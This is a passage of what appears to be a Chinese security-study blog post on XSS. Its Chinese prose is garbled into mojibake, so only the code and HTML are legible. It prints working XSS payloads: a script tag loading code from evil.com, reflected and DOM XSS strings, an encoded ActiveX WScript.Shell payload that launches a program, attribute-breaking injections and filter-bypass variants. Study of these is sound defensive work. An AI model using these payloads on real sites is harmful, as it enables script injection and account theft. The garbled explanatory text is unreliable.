ä¸ªå…³é”®è¯ï¼šä¸åŒåŸŸã€å®¢æˆ·ç«¯è„šæœ¬ã€æˆæƒã€è¯»å†™ã€èµ„æºã€‚</p><p>&emsp;&emsp;åŒåŸŸè¦æ±‚ä¸¤ä¸ªç«™ç‚¹åŒåè®®ã€åŒåŸŸåã€åŒç«¯å£ã€‚</p><p>&emsp;&emsp;æˆæƒï¼šHTML5æ–°æ ‡å‡†ä¸­æåˆ°å…³äºAJAXè·¨åŸŸè®¿é—®é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸å…è®¸çš„ï¼Œåªæœ‰ç›®æ ‡ç«™ç‚¹æ˜ç¡®çš„è¿”å›HTTPå“åº”å¤´ï¼š<code>Access-Control-Allow-Origin: http://www.evil.com</code></p><p>&emsp;&emsp;èµ„æºï¼šåŒ…æ‹¬HTTPæ¶ˆæ¯å¤´ã€æ•´ä¸ªDOMæ ‘ã€æµè§ˆå™¨å­˜å‚¨ç­‰</p><p>&emsp;&emsp;DOMï¼šå…¨ç§°Document Object Modelï¼Œå³æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œå°±æ˜¯æµè§ˆå™¨å°†HTML/XMLè¿™æ ·çš„æ–‡æ¡£æŠ½è±¡æˆä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼Œæ ‘ä¸Šçš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½ä»£è¡¨HTML/XMLä¸­çš„æ ‡ç­¾ã€æ ‡ç­¾å±æ€§æˆ–æ ‡ç­¾å†…å®¹ã€‚</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>&emsp;&emsp;urlæœ‰ä¸ªé‡ç‚¹å°±æ˜¯ç¼–ç æ–¹å¼ï¼Œæœ‰ä¸‰ç±»ï¼šescapeã€encodeURIã€encodeURIComponent,å¯¹åº”çš„è§£ç å‡½æ•°æ˜¯ï¼šunescapeã€decodeURIã€decodeURIComponentã€‚</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>&emsp;&emsp;XSSå…¨ç§°ä¸ºè·¨ç«™è„šæœ¬(Cross Site Scripting)ã€‚è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»æ˜¯ä¸€ç§æ³¨å°„å‹æ”»å‡»ï¼Œæ”»å‡»è€…åœ¨å¯ä¿¡çš„ç½‘é¡µä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œç”¨æˆ·è®¿é—®å¯ä¿¡ç½‘é¡µæ—¶è§¦å‘XSSè€Œè¢«æ”»å‡»ã€‚</p><p>&emsp;&emsp;å¾ˆå¤šæ—¶å€™è¾“å…¥çš„å†…å®¹é•¿åº¦æ˜¯æœ‰é™åˆ¶çš„ã€‚çœŸæ­£çš„XSSå¼¹çª—æ¯«æ— æ„ä¹‰ï¼Œæ‰€ä»¥æ”»å‡»ä»£ç å¯èƒ½ä¼šæ¯”è¾ƒé•¿ï¼Œä¸€èˆ¬æ³¨å…¥ç±»ä¼¼çš„ä¸‹é¢çš„å¼•ç”¨ç¬¬ä¸‰æ–¹åŸŸä¸Šçš„è„šæœ¬<code>&lt;script&gt;src=&quot;http://www.evil.com/xss.js&quot;&gt;&lt;/script&gt;</code></p><h3 id="åå°„å‹-XSS"><a href="#åå°„å‹-XSS" class="headerlink" title="åå°„å‹ XSS"></a>åå°„å‹ XSS</h3><p>&emsp;&emsp;å‘å‡ºè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡ç«¯è§£æåå“åº”ï¼Œåœ¨å“åº”å†…å®¹ä¸­å‡ºç°è¿™æ®µXSSä»£ç ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡Œã€‚è¿™ä¸ªè¿‡ç¨‹å°±åƒæ˜¯ä¸€æ¬¡åå°„ï¼Œæ•…ç§°ä¸ºåå°„å‹XSSã€‚</p><p>&emsp;&emsp;ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œåœ¨<a href="http://www.foo.com/xss/reflect1.phpä»£ç å¦‚ä¸‹`" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.phpä»£ç å¦‚ä¸‹`</a><?php echo $_GET['x'] ?><code>ï¼Œè¾“å…¥çš„xçš„å€¼æœªç»ä»»ä½•è¿‡æ»¤å°±ç›´æ¥è¾“å‡ºï¼Œå¯ä»¥æäº¤ï¼š</code><a href="http://www.foo.com/xss/reflect1.php?x=" target="_blank" rel="noopener">http://www.foo.com/xss/reflect1.php?x=</a><script>alert(/Hello,/)</script><code>ï¼ŒæœåŠ¡ç«¯è§£ææ—¶ï¼Œechoå°±ä¼šå®Œæ•´åœ°è¾“å‡º</code><script>alert(/you are hacked by V, haha!/)</script>`åˆ°å“åº”ä½“ä¸­ï¼Œç„¶åæµè§ˆå™¨è§£ææ‰§è¡Œè§¦å‘ã€‚ã€å½©è›‹å“ˆå“ˆã€‘</p><h3 id="å­˜å‚¨å‹-XSS"><a href="#å­˜å‚¨å‹-XSS" class="headerlink" title="å­˜å‚¨å‹ XSS"></a>å­˜å‚¨å‹ XSS</h3><p>&emsp;&emsp;å­˜å‚¨å‹XSSå’Œåå°„å‹XSSçš„å·®åˆ«ä»…åœ¨äºï¼›æäº¤çš„XSSä»£ç ä¼šå­˜å‚¨åœ¨æœåŠ¡ç«¯ï¼Œä¸‹æ¬¡è¯·æ±‚ç›®æ ‡é¡µé¢æ—¶ä¸ç”¨å†æäº¤XSSä»£ç ï¼Œæœ€å…¸å‹çš„ä¾‹å­æ˜¯ç•™è¨€æ¿XSSã€‚</p><p>&emsp;&emsp;é™¤äº†ç•™è¨€æ¿ï¼Œå¦‚æœæœåŠ¡ç«¯æœ‰ä¸€äº›è®°å½•ipçš„çš„åŠŸèƒ½ç”šè‡³å¯ä»¥ç”¨X-Forwarded-Foræ‰“XSSï¼Œè§<a href="https://xz.aliyun.com/t/7887" target="_blank" rel="noopener">ä¿¡å‘¼OAå­˜å‚¨å‹XSS 0dayå¤ç°</a></p><h3 id="DOMå‹-XSS"><a href="#DOMå‹-XSS" class="headerlink" title="DOMå‹ XSS"></a>DOMå‹ XSS</h3><p>&emsp;&emsp;DOMå‹ XSSä¸åå°„å‹ã€å­˜å‚¨å‹çš„å·®åˆ«åœ¨äºï¼ŒDOMå‹ XSSçš„XSSä»£ç å¹¶ä¸éœ€è¦æœåŠ¡å™¨è§£æå“åº”çš„ç›´æ¥å‚ä¸ï¼Œè§¦å‘XSSé çš„å°±æ˜¯æµè§ˆå™¨ç«¯çš„DOMè§£æï¼Œå¯ä»¥è®¤ä¸ºå®Œå…¨æ˜¯å®¢æˆ·ç«¯çš„äº‹ã€‚</p><p>&emsp;&emsp;<a href="https://www.zhihu.com/question/26628342/answer/33504799" target="_blank" rel="noopener">çŸ¥ä¹</a>ä¸Šä¹Ÿæœ‰ä¸€ç§è¯´æ³•ï¼šDOMå‹XSSå–å†³äºè¾“å‡ºä½ç½®ï¼Œå¹¶ä¸å–å†³äºè¾“å‡ºç¯å¢ƒï¼Œç®€å•å»ç†è§£å°±æ˜¯å› ä¸ºä»–è¾“å‡ºç‚¹åœ¨DOMï¼Œæ‰€ä»¥åœ¨é“å“¥çš„ã€Šç™½å¸½å­è®²Webå®‰å…¨é‡Œã€‹ä¹Ÿæœ‰è¯¦ç»†ä»‹ç»ã€‚DOMå‹XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ã€‚</p><p>&emsp;&emsp;ç„¶åé—®äº†ä¸€äº›Webå¸ˆå‚…ï¼Œä»–ä»¬çš„å›ç­”æ˜¯ï¼ŒæŠŠDOMå‹XSSçœ‹ä½œæ˜¯åå°„å‹XSSçš„ä¸€ç§ï¼Œæ˜¯åœ¨å‰ç«¯å®ç°çš„ã€‚æ‰€ä»¥DOMå‹å’Œåå°„å‹XSSéƒ½åªèƒ½è‡ªå·±æ—¥è‡ªå·±ï¼Œéƒ½æ˜¯éœ€è¦ä¸äººäº¤äº’æ‰èƒ½äº§ç”Ÿæ•ˆæœã€‚</p><h4 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h4><p>æ¥æºï¼š<a href="https://xz.aliyun.com/t/3919" target="_blank" rel="noopener">è®°ä¸€æ¬¡ä»DOMå‹XSSåˆ°RCEè¿‡ç¨‹</a></p><p>æ‰“å¼€ä¸»é¡µä¼šè°ƒç”¨index.jsæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/07/16/xSPd7bw4BTWqUOC.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¼šç”¨getParamå‡½æ•°æ¥å—æäº¤è¿‡æ¥çš„platformå‚æ•°ï¼Œå¤„ç†åç›´æ¥ä¼ ç»™eval</p><p>å†è·Ÿè¿›getParamå‡½æ•°</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç”¨æ­£åˆ™è¡¨è¾¾å¼è·å–åœ°å€æ å‚æ•°</span></span><br><span class="line">function getParam(paramName) &#123;</span><br><span class="line">    paramValue = <span class="string">""</span>, isFound = !<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.location.search.indexOf(<span class="string">"?"</span>) == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.location.search.indexOf(<span class="string">"="</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        arrSource = unescape(<span class="keyword">this</span>.location.search).substring(<span class="number">1</span>, <span class="keyword">this</span>.location.search.length).split(<span class="string">"&amp;"</span>), i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; arrSource.length &amp;&amp; !isFound) arrSource[i].indexOf(<span class="string">"="</span>) &gt; <span class="number">0</span> &amp;&amp; arrSource[i].split(<span class="string">"="</span>)[<span class="number">0</span>].toLowerCase() == paramName.toLowerCase() &amp;&amp; (paramValue = arrSource[i].split(<span class="string">"="</span>)[<span class="number">1</span>], isFound = !<span class="number">0</span>), i++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> paramValue == <span class="string">""</span> &amp;&amp; (paramValue = <span class="literal">null</span>), paramValue</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¹¶æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„å‚æ•°å€¼æ˜¯å®Œæ•´çš„è¢«è¿”å›è¿‡æ¥çš„ã€‚è¿™é‡Œå°±é€ æˆäº†ä»£ç æ‰§è¡Œã€‚</p><p>payload:<code>http://xxx.xxx.xxx.xxx/?platform=alert(â€œxssâ€)</code>ï¼Œæ‰§è¡Œæ•ˆæœ</p><p><img src="https://i.loli.net/2020/07/16/jSbda5qKkgpB7cY.png" alt="img"></p><p>RCEæ‰§è¡Œ-payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="type">ActiveXObject</span>(<span class="string">"WScript.Shell"</span>);</span><br><span class="line">o.run(â€œcalc.exeâ€);</span><br></pre></td></tr></table></figure><p>ä¸ºäº†ç¾è§‚ï¼Œæˆ‘ä»¬å¯¹ä»£ç è¿›è¡Œç¼–ç ï¼Œç¼–ç åä»£ç å¦‚ä¸‹ï¼ˆå¤´å°¾ä¸¤ä¸ªå›è½¦ç¬¦ï¼‰</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(<span class="number">10</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">61</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">118</span>,<span class="number">101</span>,<span class="number">88</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">106</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">87</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>,<span class="number">111</span>,<span class="number">46</span>,<span class="number">114</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>,<span class="number">46</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">101</span>,<span class="number">39</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>ç„¶è€Œæµè§ˆå™¨çš„å®‰å…¨æœºåˆ¶é»˜è®¤ç¦æ­¢ä½¿ç”¨activexæ§ä»¶ï¼Œæ‰€ä»¥ã€‚è¿˜å¾—åˆ©ç”¨ä¸€äº›æµè§ˆå™¨çš„æ¼æ´æ¥ç»•è¿‡ã€‚</p><h3 id="åœºæ™¯-HTML"><a href="#åœºæ™¯-HTML" class="headerlink" title="åœºæ™¯(HTML)"></a>åœºæ™¯(HTML)</h3><p>&emsp;&emsp;XSSæ¶‰åŠçš„åœºæ™¯å¾ˆå¹¿ï¼Œå‡ºç°åœ¨æ”¯æŒHTMLè§£æå’ŒJavaScriptè§£æçš„å®¢æˆ·ç«¯è½¯ä»¶ã€é¡µé¢ä¸Šã€‚åœ¨è§¦å‘XSSæ—¶æˆ‘ä»¬éœ€è¦å…³æ³¨è¾“å…¥ç‚¹ä¸è¾“å‡ºç‚¹ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆå‡è®¾æœ‰ä¸€ä¸ªid=1çš„è¾“å…¥ç‚¹ï¼Œé’ˆå¯¹ä¸åŒçš„è¾“å‡ºç‚¹ï¼Œæˆ‘ä»¬çš„åˆ©ç”¨æ–¹å¼åˆ™æ˜¯ä¸åŒçš„ã€‚</p><p>Â· HTMLæ ‡ç­¾ä¹‹é—´ï¼Œæ¯”å¦‚ï¼šå‡ºç°åœ¨<code>&lt;div id=&quot;bodyâ€&gt;[è¾“å‡º]&lt;/div&gt;</code>ä½ç½®</p><p>Â· HTMLæ ‡ç­¾ä¹‹å†…ï¼Œæ¯”å¦‚ï¼šå‡ºç°åœ¨<code>&lt;input type=&quot;textâ€ value = &quot;[è¾“å‡º]&quot;/&gt;</code>ä½ç½®</p><p>Â· æˆä¸ºJavaScriptä»£ç çš„å€¼ï¼Œæ¯”å¦‚ï¼š<code>&lt;script&gt;a=&quot;[è¾“å‡º]&quot;,...&lt;/script&gt;</code>ä½ç½®</p><p>Â· æˆä¸ºCSSä»£ç çš„å€¼ï¼Œæ¯”å¦‚ï¼š<code>&lt;style&gt;body{font-size:[è¾“å‡º]px;...}&lt;/style&gt;</code>ä½ç½®</p><h4 id="1-HTMLæ ‡ç­¾ä¹‹é—´"><a href="#1-HTMLæ ‡ç­¾ä¹‹é—´" class="headerlink" title="1. HTMLæ ‡ç­¾ä¹‹é—´"></a>1. HTMLæ ‡ç­¾ä¹‹é—´</h4><p>&emsp;&emsp;æœ€æ™®é€šçš„å‡ºç°åœ¨<code>&lt;div id=&quot;bodyâ€&gt;[è¾“å‡º]&lt;/div&gt;</code>ä½ç½®ï¼Œé‚£ä¹ˆæäº¤<code>id=1&lt;script&gt;alert(1)&lt;/script&gt;</code>å°±å¯äº†ï¼Œä½†æ˜¯åœ¨<code>&lt;title&gt;&lt;textarea&gt;&lt;xmp&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;plaintext&gt;</code>æ ‡ç­¾é‡Œé¢å°±ä¸è¡Œï¼Œå› ä¸ºè¿™äº›æ ‡ç­¾å†…æ— æ³•æ‰§è¡Œè„šæœ¬ï¼Œæˆ‘ä»¬å¾—å…ˆå°†è¿™äº›æ ‡ç­¾ç»™é—­åˆã€‚å¦å¤–ï¼Œ<code>&lt;script&gt;&lt;style&gt;</code> æ˜¯ä¸èƒ½åµŒå¥—æ ‡ç­¾çš„ã€‚</p><h4 id="2-HTMLæ ‡ç­¾ä¹‹å†…"><a href="#2-HTMLæ ‡ç­¾ä¹‹å†…" class="headerlink" title="2. HTMLæ ‡ç­¾ä¹‹å†…"></a>2. HTMLæ ‡ç­¾ä¹‹å†…</h4><p>&emsp;&emsp;æœ€æ™®é€šçš„åœºæ™¯å‡ºç°åœ¨<code>&lt;input type=&quot;textâ€ value = &quot;[è¾“å‡º]&quot;/&gt;</code>ï¼Œè¦è§¦å‘XSSæœ‰ä¸€ä¸‹ä¸¤ç§æ–¹æ³•</p><p><code>â€onmouserover=alert(1)x=â€</code>ï¼Œè¿™ç§æ˜¯ç”¨åŒå¼•å·é—­åˆå±æ€§ï¼Œç„¶åç”¨onäº‹ä»¶æ¥è§¦å‘è„šæœ¬ã€‚ã€è¿™ç§è§¦å‘æˆåŠŸç‡æ›´é«˜ã€‘</p><p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œè¿™ç§æ˜¯å…ˆç”¨åŒå¼•å·é—­åˆå±æ€§ï¼Œç„¶åç”¨å°–æ‹¬å·åˆé—­åˆäº†æ ‡ç­¾ï¼Œç„¶åç›´æ¥æ‰§è¡Œè„šæœ¬ ã€è¿™ç§åˆ©ç”¨æ•ˆæœå¥½ã€‘</p><p>&emsp;&emsp;æ¢ä¸€ç§åœºæ™¯ï¼š<code>&lt;input type=&quot;hidden&quot; value=&quot;[è¾“å‡º]&quot; /&gt;</code>ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ­¤æ—¶æˆ‘ä»¬åªèƒ½é—­åˆinputæ ‡ç­¾ï¼Œå¦åˆ™ç”±äºhiddenç‰¹æ€§å¯¼è‡´è§¦å‘ä¸äº†XSSï¼Œä½†å¦‚æœæ˜¯è¿™ç§è¯­å¥<code>&lt;input  value=&quot;[è¾“å‡º]&quot;  type=&quot;hidden&quot;/&gt;</code>ï¼Œä»…ä»…æ˜¯è°ƒæ¢äº†ä¸¤ä¸ªå±æ€§çš„ä½ç½®ï¼Œæˆ‘ä»¬åˆ™å¯ä»¥ç”¨è¿™æ ·ä¸€æ¡payloadï¼š<code>1&quot; onmouserover=alert(1) type = &quot;text</code></p><p>&emsp;&emsp;è¾“å‡ºåå˜ä¸º<code>&lt;input  value=&quot;1&quot; onmouserover=alert(1) type = &quot;text&quot;  type=&quot;hidden&quot;/&gt;</code>ï¼Œè¿™æ ·è¾“å‡ºçš„å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è¾“å…¥æ¡†ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªéšè—çš„è¡¨å•ï¼ˆhiddenè¢«textæ’é˜Ÿäº†ï¼‰</p><p>&emsp;&emsp;å¦å¤–ä¸¤ç§åœºæ™¯ï¼š</p><p>è¾“å‡ºåœ¨src/href/actionç­‰å±æ€§å†…ï¼Œæ¯”å¦‚<code>&lt;a href = &quot;[è¾“å‡º]â€&gt;click me&lt;/a&gt;</code></p><p>è¿™é‡Œæˆ‘ä»¬é™¤äº†å„ç§é—­åˆå¤–ï¼Œè¿˜å¯ä»¥ï¼š</p><p><code>javascript:alert(1)//</code></p><p><code>data:text/html;base64,PHNjcm1wdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå‰ææ˜¯æˆ‘ä»¬æäº¤çš„payloadå¿…é¡»å‡ºç°åœ¨è¿™äº›å±æ€§å€¼çš„å¼€å¤´ï¼ˆdataåè®®å¿…é¡»ä½œä¸ºæ•´ä¸ªå±æ€§å€¼å‡ºç°ï¼‰</p><p>&emsp;&emsp;è¾“å‡ºåœ¨onäº‹ä»¶å†…ï¼š</p><p>ç”±äºonäº‹ä»¶å†…æ˜¯å¯ä»¥æ‰§è¡ŒJavaScriptè„šæœ¬çš„ï¼Œæ ¹æ®ä¸åŒåœºæ™¯ï¼Œæˆ‘ä»¬éœ€è¦å¼„æ¸…æ¥šæˆ‘ä»¬çš„è¾“å…¥æ˜¯ä½œä¸ºæ•´ä¸ªonäº‹ä»¶å‡ºç°ï¼Œè¿˜æ˜¯ä»¥æŸä¸ªå‡½æ•°çš„å‚æ•°å€¼å‡ºç°ã€è¿™ä¸ªå‡½æ•°åˆæ˜¯ä»€ä¹ˆç­‰ã€‚å› ä¸ºæ ¹æ®ä¸åŒçš„åœºæ™¯æˆ‘ä»¬å¯èƒ½éœ€è¦ä¸åŒçš„é—­åˆç­–ç•¥ã€‚</p><p>æœ€ç®€å•çš„åœºæ™¯å°±æ˜¯ï¼š<code>&lt;a href=&quot;#&quot; onclick =&quot;eval(&#39;è¾“å‡º&#39;)&quot;&gt;click me &lt;/a&gt;</code></p><h3 id="DOMæ¸²æŸ“"><a href="#DOMæ¸²æŸ“" class="headerlink" title="DOMæ¸²æŸ“"></a>DOMæ¸²æŸ“</h3><h4 id="HTMLä¸JavaScriptè‡ªè§£ç æœºåˆ¶"><a href="#HTMLä¸JavaScriptè‡ªè§£ç æœºåˆ¶" class="headerlink" title="HTMLä¸JavaScriptè‡ªè§£ç æœºåˆ¶"></a>HTMLä¸JavaScriptè‡ªè§£ç æœºåˆ¶</h4><p>&emsp;&emsp;å½“ä¸€æ®µJavaScriptä»£ç å‡ºç°åœ¨HTMLæ ‡ç­¾å†…ï¼Œé‚£ä¹ˆè¿™é‡Œçš„JavaScriptå¯ä»¥è¿›è¡ŒHTMLå½¢å¼çš„ç¼–ç ï¼šè¿›åˆ¶ç¼–ç ï¼ˆåè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼‰ï¼ŒHTMLå®ä½“ç¼–ç ã€‚ä¾‹å¦‚ï¼š</p><p><code>&lt;input type=&quot;buttonâ€ id = &quot;exec_btnâ€ value=&quot;execâ€ onclik=&quot;x=&#39;&amp;lt;img src = @ onerror=alert(123) /&amp;gt;&#39;;alert(x);document.write(x)â€ /&gt;</code></p><p>&emsp;&emsp;ä½†æ˜¯å¦‚æœç”¨æˆ·è¾“å…¥å‡ºç°åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾å†…ï¼Œè¿™æ®µå†…å®¹è¦éµå®ˆçš„å°±æ˜¯JavaScriptçš„æ³•åˆ™ï¼Œå³JavaScriptç¼–ç ï¼šUnicodeå½¢å¼ï¼š\uHï¼ˆåå…­è¿›åˆ¶ï¼‰ï¼›æ™®é€šåå…­è¿›åˆ¶ï¼ˆ\xHï¼‰ï¼›çº¯è½¬ä¹‰ï¼šï¼ˆåœ¨ç‰¹æ®Šå­—ç¬¦å‰é¢åŠ \è¿›è¡Œè½¬ä¹‰ã€‚ï¼‰</p><p>&emsp;&emsp;å¦å¤–ï¼Œåœ¨<code>&lt;textarea&gt;&lt;title&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;xmp&gt;</code>è¿™å‡ ä¸ªæ ‡ç­¾ä¸­HTMLä¹Ÿæ˜¯ä¸è§£æçš„ã€‚<code>&lt;plaintext&gt;</code>åˆ™åœ¨Firefoxä¸‹ä¸è§£æï¼Œåœ¨Chromeä¸‹å°±ä¼šã€‚</p><h3 id="XSSè¿‡æ»¤ä¸ç»•è¿‡"><a href="#XSSè¿‡æ»¤ä¸ç»•è¿‡" class="headerlink" title="XSSè¿‡æ»¤ä¸ç»•è¿‡"></a>XSSè¿‡æ»¤ä¸ç»•è¿‡</h3><p>å‚è€ƒ<a href="https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%B9%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A0%81" target="_blank" rel="noopener">å‰ç«¯Hackä¹‹XSSæ”»å‡»ä¸ªäººå­¦ä¹ ç¬”è®°</a></p><h4 id="ç©ºæ ¼ã€å›è½¦å’Œtab"><a href="#ç©ºæ ¼ã€å›è½¦å’Œtab" class="headerlink" title="ç©ºæ ¼ã€å›è½¦å’Œtab"></a>ç©ºæ ¼ã€å›è½¦å’Œtab</h4><p>&emsp;&emsp;å¯¹XSS-Filterè€Œè¨€ï¼Œå¦‚æœä»…ä»…æ˜¯å°†å‡½æ•°åŠ å…¥é»‘åå•ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨å‡½æ•°åç§°ä¹‹ä¸­å°è¯•åŠ å…¥ç©ºæ ¼ã€å›è½¦ã€Tabç­‰é”®ä½ç¬¦æ¥è¿›è¡Œç»•è¿‡ã€‚è¿™æ˜¯ç”±äºåœ¨JavaScriptä¸­åªä¼šå°†ï¼›ä½œä¸ºè¯­å¥çš„ç»ˆæ­¢ç¬¦ï¼Œå½“æµè§ˆå™¨å¼•æ“è§£æJavaScriptè„šæœ¬æ—¶æ²¡æœ‰åŒ¹é…åˆ°ï¼›ä¾¿ä¼šç»§ç»­å¤„ç†ï¼ŒçŸ¥é“å‘ç°ä¸‹ä¸ªåˆ†å·ä¸ºæ­¢ï¼Œè€Œæ¢è¡Œç¬¦å¹¶ä¸æ˜¯ç»ˆæ­¢ç¬¦ã€‚å¦‚ä¸‹åˆ—ä»£ç å¯ç»•è¿‡å¯¹å…³é”®å­—JavaScript|alertçš„è¿‡æ»¤ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javasc</span></span></span><br><span class="line"><span class="tag"><span class="attr">ript:aler</span></span></span><br><span class="line"><span class="tag"><span class="attr">t</span>(/<span class="attr">xss</span>/)&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç "><a href="#å¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç " class="headerlink" title="å¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç "></a>å¯¹æ ‡ç­¾å±æ€§å€¼è¿›è¡Œè½¬ç </h4><p><code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code>  =&gt;  <code>&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(&#39;xss&#39;);&quot;&gt;</code></p><p>ç”±äºæˆ‘ä»¬çš„è¾“å…¥å‡ºç°åœ¨<code>&lt;img&gt;</code>æ ‡ç­¾å†…ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œå®ä½“ç¼–ç æ¥ç»•è¿‡è¿‡æ»¤ã€‚</p><h4 id="ä½¿ç”¨CSSç»•è¿‡"><a href="#ä½¿ç”¨CSSç»•è¿‡" class="headerlink" title="ä½¿ç”¨CSSç»•è¿‡"></a>ä½¿ç”¨CSSç»•è¿‡</h4><p>åˆ©ç”¨CSSæ ·å¼è¡¨å¯ä»¥æ‰§è¡ŒJavaScriptçš„ç‰¹æ€§ï¼Œå¦‚</p><p>CSSç›´æ¥æ‰§è¡ŒJavaScriptï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background-image:url(javascript:alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSSä¸­ä½¿ç”¨expressionæ‰§è¡ŒJavaScript:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: expression(alert('xss'))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">style</span>=<span class="string">"xss:expression(alert(/xss/))"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">expression</span>(<span class="string">"alert('xss')"</span>);&#125;</span></span><br><span class="line"><span class="tag">&lt;/<span 